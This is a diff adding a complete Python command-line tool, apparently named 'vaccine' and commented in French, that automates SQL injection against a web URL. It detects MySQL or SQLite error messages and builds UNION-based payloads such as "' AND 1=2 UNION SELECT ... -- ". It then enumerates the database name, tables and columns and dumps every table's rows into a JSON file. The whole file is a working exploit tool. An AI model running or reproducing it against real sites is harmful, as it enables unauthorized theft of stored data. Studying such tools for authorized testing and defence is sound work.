@@ -1,0 +1,311 @@
+#!/usr/bin/env python3
+import argparse
+import json
+import os
+import re
+import sys
+import time
+from datetime import datetime
+import urllib.request
+from urllib.error import HTTPError, URLError
+from urllib.parse import urlencode, urlsplit, parse_qsl
+
+# Fragments caracteristiques des messages d'erreur, par moteur.
+# Volontairement courts : les phrases completes changent selon les versions.
+ERROR_SIGNATURES = {
+    "mysql":  ["You have an error in your SQL syntax", "MySQL server version"],
+    "sqlite": ["unrecognized token", "SQL logic error", "sqlite3."],
+}
+
+MARK_A = "qXv"
+MARK_B = "q"
+MARKER = MARK_A + MARK_B
+MAX_COLUMNS = 12
+
+CONTEXTS = [
+    "-1 ",          # contexte entier
+    "' AND 1=2 ",   # contexte chaine
+]
+
+MARKER_SQL = {
+    "mysql":  "CONCAT('{a}','{b}')",
+    "sqlite": "'{a}' || '{b}'",
+}
+WRAP = {
+    "mysql":  "CONCAT('{a}','{b}', {expr}, '{a}','{b}')",
+    "sqlite": "'{a}' || '{b}' || {expr} || '{a}' || '{b}'",
+}
+
+ROW_SEP = "~~"
+
+GROUP = {
+    "mysql":  "group_concat({expr} SEPARATOR '{sep}')",
+    "sqlite": "group_concat({expr}, '{sep}')",
+}
+
+ENGINE_SQL = {
+    "mysql": {
+        "database": ("database()", ""),
+        "tables":   ("table_name",
+                     "FROM information_schema.tables "
+                     "WHERE table_schema = database()"),
+        "columns":  ("column_name",
+                     "FROM information_schema.columns "
+                     "WHERE table_schema = database() AND table_name = '{table}'"),
+    },
+    "sqlite": {
+        "database": ("'main'", ""),
+        "tables":   ("name",
+                     "FROM sqlite_master "
+                     "WHERE type = 'table' AND name NOT LIKE 'sqlite_%'"),
+        "columns":  ("name", "FROM pragma_table_info('{table}')"),
+    },
+}
+
+def parse_target(url):
+    if "://" not in url :
+        url = "http://" + url
+    split_res = urlsplit(url)
+    parse = (split_res.scheme + "://" + split_res.netloc + split_res.path, dict(parse_qsl(split_res.query)))
+    return parse
+
+def send(url, params, method):
+    query = urlencode(params)
+
+    data = None
+    if method == "POST" :
+        data = query.encode("utf-8")
+    elif query :
+        url = url + "?" + query
+
+    req = urllib.request.Request(url, data=data, method=method)
+
+    start = time.time()
+    try :
+        resp = urllib.request.urlopen(req, timeout=10)
+        body = resp.read().decode("utf-8", errors="replace")
+        code = resp.status
+    except HTTPError as e :
+        body = e.read().decode("utf-8", errors="replace")
+        code = e.code
+    except URLError :
+        body = ""
+        code = 0
+    duration = time.time() - start
+
+    return body, code, duration
+
+def baseline(url, params, method) :
+    """Reponse de reference : la cible interrogee avec ses parametres d'origine."""
+    return send(url, params, method)
+
+
+def detect_engine(url, params, method) :
+    """Ajoute une quote a chaque parametre et cherche une signature d'erreur SQL.
+
+    Renvoie {"engine", "param", "payload"} au premier match, None sinon.
+    """
+    for name in params :
+        payload = params[name] + "'"
+
+        test = dict(params)
+        test[name] = payload
+
+        body, code, duration = send(url, test, method)
+
+        for engine, signatures in ERROR_SIGNATURES.items() :
+            for signature in signatures :
+                if signature in body :
+                    return {"engine": engine, "param": name, "payload": payload}
+
+    return None
+
+
+def union_payload(context, columns, source="") :
+    """Assemble un payload UNION complet, commentaire final inclus."""
+    payload = context + "UNION SELECT " + ", ".join(columns)
+    if source :
+        payload = payload + " " + source
+    return payload + " -- "
+
+
+def find_column_count(url, params, method, param, engine) :
+    """Cherche le nombre de colonnes et le contexte d'injection.
+
+    Injecte un marqueur dans un nombre croissant de colonnes : le voir
+    reapparaitre dans la page prouve que l'UNION est passe.
+    Renvoie (nombre, contexte), ou (0, None) si aucune combinaison ne marche.
+    """
+    probe = MARKER_SQL[engine].format(a=MARK_A, b=MARK_B)
+
+    for context in CONTEXTS :
+        for count in range(1, MAX_COLUMNS + 1) :
+            columns = [probe] * count
+
+            test = dict(params)
+            test[param] = union_payload(context, columns)
+
+            body, code, duration = send(url, test, method)
+            if MARKER in body :
+                return count, context
+
+    return 0, None
+
+
+def union_extract(url, params, method, param, count, context, engine, expression, source="") :
+    """Injecte une expression SQL et renvoie les valeurs qu'elle a produites."""
+    marked = WRAP[engine].format(a=MARK_A, b=MARK_B, expr=expression)
+
+    test = dict(params)
+    test[param] = union_payload(context, [marked] * count, source)
+
+    body, code, duration = send(url, test, method)
+
+    values = []
+    for value in re.findall(MARKER + "(.*?)" + MARKER, body, re.S) :
+        if value not in values :
+            values.append(value)
+    return values
+
+
+def grouped(engine, expression) :
+    """Enveloppe une expression dans un group_concat : N lignes -> 1 cellule."""
+    return GROUP[engine].format(expr=expression, sep=ROW_SEP)
+
+
+def row_expression(engine, columns) :
+    """Concatene les colonnes d'une ligne en une seule chaine 'a:b:c'."""
+    if engine == "mysql" :
+        return "CONCAT_WS(':', " + ", ".join(columns) + ")"
+    return " || ':' || ".join("IFNULL(%s, '')" % name for name in columns)
+
+
+def enumerate_db(url, params, method, param, count, context, engine) :
+    """Recupere nom de base, tables, colonnes et contenu de chaque table."""
+    sql = ENGINE_SQL[engine]
+    target = (url, params, method, param, count, context, engine)
+
+    result = {"database": None, "tables": {}}
+
+    values = union_extract(*target, *sql["database"])
+    if values :
+        result["database"] = values[0]
+
+    expression, source = sql["tables"]
+    values = union_extract(*target, grouped(engine, expression), source)
+    if not values :
+        return result
+
+    for table in values[0].split(ROW_SEP) :
+        expression, source = sql["columns"]
+        values = union_extract(*target, grouped(engine, expression),
+                               source.format(table=table))
+        columns = values[0].split(ROW_SEP) if values else []
+
+        rows = []
+        if columns :
+            expression = grouped(engine, row_expression(engine, columns))
+            values = union_extract(*target, expression, "FROM " + table)
+            if values :
+                rows = values[0].split(ROW_SEP)
+
+        result["tables"][table] = {"columns": columns, "rows": rows}
+
+    return result
+
+
+def save_report(path, report) :
+    """Ajoute un rapport a l'archive JSON, creee au premier run si absente."""
+    archive = []
+    if os.path.exists(path) :
+        try :
+            with open(path) as handle :
+                archive = json.load(handle)
+        except (ValueError, OSError) :
+            archive = []
+
+    archive.append(report)
+
+    with open(path, "w") as handle :
+        json.dump(archive, handle, indent=2, ensure_ascii=False)
+
+
+def finish(path, report, status) :
+    """Ecrit l'archive puis rend le code de sortie du programme."""
+    save_report(path, report)
+    return status
+
+
+def parse_args() :
+    parser = argparse.ArgumentParser(
+        prog="vaccine",
+        description="Detecte les injections SQL sur une URL.")
+    parser.add_argument("url",
+                        help="URL cible, parametres inclus")
+    parser.add_argument("-o", metavar="FICHIER", default="vaccine.json",
+                        help="fichier d'archive (defaut: vaccine.json)")
+    parser.add_argument("-X", metavar="METHODE", default="GET", choices=["GET", "POST"],
+                        help="methode HTTP: GET ou POST (defaut: GET)")
+    return parser.parse_args()
+
+def main():
+    args = parse_args()
+    url, params = parse_target(args.url)
+
+    report = {
+        "date": datetime.now().isoformat(timespec="seconds"),
+        "url": url,
+        "method": args.X,
+        "vulnerable": False,
+    }
+
+    if not params :
+        print(f"[!] aucun parametre a tester dans l'URL : {args.url}")
+        return finish(args.o, report, 1)
+
+    body, code, duration = baseline(url, params, args.X)
+    if code == 0 :
+        print(f"[!] cible injoignable : {url}")
+        return finish(args.o, report, 1)
+
+    print(f"[*] cible      : {url}")
+    print(f"[*] methode    : {args.X}")
+    print(f"[*] parametres : {', '.join(params)}")
+    print(f"[*] archive    : {args.o}")
+    print(f"[*] baseline   : {code}, {len(body)} octets, {duration:.3f}s")
+
+    found = detect_engine(url, params, args.X)
+    if found is None :
+        print("[-] aucune erreur SQL declenchee : error-based inefficace ici")
+        return finish(args.o, report, 0)
+
+    report.update(found)
+    print(f"[+] moteur     : {found['engine']}")
+    print(f"[+] parametre  : {found['param']}")
+    print(f"[+] payload    : {found['payload']}")
+
+    count, context = find_column_count(url, params, args.X, found["param"], found["engine"])
+    if count == 0 :
+        print("[-] UNION impossible sur ce parametre")
+        return finish(args.o, report, 0)
+
+    report["vulnerable"] = True
+    report["columns"] = count
+    report["context"] = context.strip()
+    print(f"[+] colonnes   : {count}")
+    print(f"[+] contexte   : {context.strip()!r}")
+
+    data = enumerate_db(url, params, args.X, found["param"], count, context, found["engine"])
+    report.update(data)
+
+    print(f"[+] base       : {data['database']}")
+    for table, content in data["tables"].items() :
+        print(f"\n    [{table}]  colonnes : {', '.join(content['columns'])}")
+        for row in content["rows"] :
+            print(f"      {row}")
+
+    print(f"\n[*] rapport ecrit dans {args.o}")
+    return finish(args.o, report, 0)
+
+if __name__ == "__main__" :
+    sys.exit(main())
